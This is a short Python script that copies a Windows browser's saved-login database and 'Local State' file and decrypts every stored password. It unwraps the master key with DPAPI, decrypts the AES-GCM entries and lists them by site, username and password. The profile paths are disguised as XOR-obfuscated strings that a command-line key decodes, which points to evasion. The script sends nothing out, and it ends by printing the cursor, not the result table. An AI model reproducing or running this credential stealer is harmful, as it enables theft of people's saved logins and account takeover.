import os
import shutil
import sqlite3, win32crypt
import json
import base64
import argparse
# pip install pycryptodomex
from Cryptodome.Cipher import AES
import prettytable

def encrypt_decrypt(data: str, key: str) -> str:
    return ''.join([chr(ord(data[i]) ^ ord(key[i % len(key)])) for i in range(len(data))])

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        print("无法解码：", buff)

parser = argparse.ArgumentParser()
parser.add_argument('--key', required=True, type=str)
args = parser.parse_args()
key = args.key

LOGIN_DATA = '锉怣镖怒镢怃镒怃锉怮镉态镇怎锉急镉怍镁怎镃恍镥怊镔怍镋怇锉怷镕怇镔恂镢怃镒怃锉怦镃怄镇怗镊怖锉怮镉怅镏怌锆怦镇怖镇'
LOCAL_STATE = '锉怣镖怒镢怃镒怃锉怮镉态镇怎锉急镉怍镁怎镃恍镥怊镔怍镋怇锉怷镕怇镔恂镢怃镒怃锉怮镉态镇怎锆怱镒怃镒怇'

if not os.path.exists('login.sqlite'):
    database_path = os.path.expanduser('~') + encrypt_decrypt(LOGIN_DATA, key)
    shutil.copy(database_path, 'login.sqlite')

if not os.path.exists('Local State'):
    local_state_path = os.path.expanduser('~') + encrypt_decrypt(LOCAL_STATE, key)
    shutil.copy(local_state_path, 'Local State')

with open('Local State', 'r') as fp:
    local_state = json.load(fp)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

conn = sqlite3.connect('login.sqlite')
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')

table = prettytable.PrettyTable(field_names=['site', 'username', 'password'])

for result in cursor.fetchall():
    site = result[0]
    username = result[1]
    password = decrypt_password(result[2], master_key)
    table.add_row([site, username, password])

print(cursor)